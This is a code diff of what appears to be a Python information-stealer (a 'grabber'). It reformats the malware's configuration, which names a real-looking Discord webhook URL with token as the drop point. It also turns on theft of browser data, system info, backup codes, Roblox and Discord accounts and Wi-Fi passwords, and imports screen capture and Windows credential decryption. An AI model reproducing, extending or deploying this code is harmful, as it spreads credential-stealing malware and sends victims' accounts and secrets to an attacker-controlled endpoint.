@@ -21,9 +21,28 @@ from PIL import ImageGrab
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
 
-__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1164219527429632000/m79zBSTd9oaTd64l6Kupzxfpn0-sxDMwzxBi6f3Qk4pPnMeGxFwkYPhwiHMcHtvS6iqS', 'ping': False, 'pingtype': 'Here', 'error': True, 'startup': False, 'defender': False, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'minecraft': False, 'wifi': True, 'killprotector': False, 'antidebug_vm': False, 'discord': True, 'anti_spam': False, 'self_destruct': False}
+__CONFIG__ = {
+    "webhook": 'https://discord.com/api/webhooks/1164219527429632000/m79zBSTd9oaTd64l6Kupzxfpn0-sxDMwzxBi6f3Qk4pPnMeGxFwkYPhwiHMcHtvS6iqS',
+    "ping": False,
+    "pingtype": "None",
+    "error": True,
+    "startup": False,
+    "defender": False,
+    "systeminfo": True,
+    "backupcodes": True,
+    "browser": True,
+    "roblox": True,
+    "obfuscation": False,
+    "injection": False,
+    "minecraft": False,
+    "wifi": True,
+    "killprotector": False,
+    "antidebug_vm": False,
+    "discord": True,
+    "anti_spam": False,
+    "self_destruct": False
+}
 
-#global variables
 temp = os.getenv("temp")
 temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
 os.mkdir(temp_path)
